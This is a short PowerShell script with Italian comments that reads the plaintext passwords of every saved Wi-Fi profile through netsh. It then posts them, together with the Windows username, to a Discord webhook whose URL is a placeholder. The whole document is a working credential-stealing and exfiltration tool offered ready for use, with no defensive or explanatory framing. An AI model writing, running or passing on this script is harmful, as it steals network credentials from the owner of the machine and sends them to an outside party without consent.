# Script PowerShell per estrarre password Wi-Fi e caricarle su Discord.

# Funzione per estrarre le password dei profili Wi-Fi
function Get-WiFiPasswords {
    $wifiProfiles = (netsh wlan show profiles) |
        Select-String "\:(.+)$" | 
        ForEach-Object {
            $name = $_.Matches.Groups[1].Value.Trim()
            # Estrai la chiave di accesso
            $profileInfo = netsh wlan show profile name="$name" key=clear
            $pass = ($profileInfo | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()

            # Se la password è vuota, assegnare "N/A"
            if (-not $pass) {
                $pass = "N/A"
            }

            # Restituisci l'oggetto con i dettagli del Wi-Fi
            [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
        }

    return $wifiProfiles
}

# Funzione di upload su Discord
function Upload-Discord {
    param (
        [string]$WebhookUrl,
        [string]$Message
    )
    
    $Body = @{
        'username' = $env:username
        'content'  = $Message
    }

    # Invia il messaggio
    if (-not [string]::IsNullOrEmpty($Message)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $WebhookUrl -Method Post -Body ($Body | ConvertTo-Json)
    }
}

# Main
$wifiPasswords = Get-WiFiPasswords

# Crea un messaggio con le password
$message = "Ecco le password dei profili Wi-Fi salvati:`n`n"

foreach ($profile in $wifiPasswords) {
    $message += "Profilo: $($profile.PROFILE_NAME)`nPassword: $($profile.PASSWORD)`n`n"
}

# Carica su Discord
$discordWebhookUrl = "WEBHOOK_DISCORD"  # Sostituisci con il tuo URL Webhook Discord
if (-not [string]::IsNullOrEmpty($discordWebhookUrl)) {
    Upload-Discord -WebhookUrl $discordWebhookUrl -Message $message
}

# Opzionale: visualizza un messaggio indicante la fine dell'operazione
Write-Host "Le password sono state inviate a Discord."
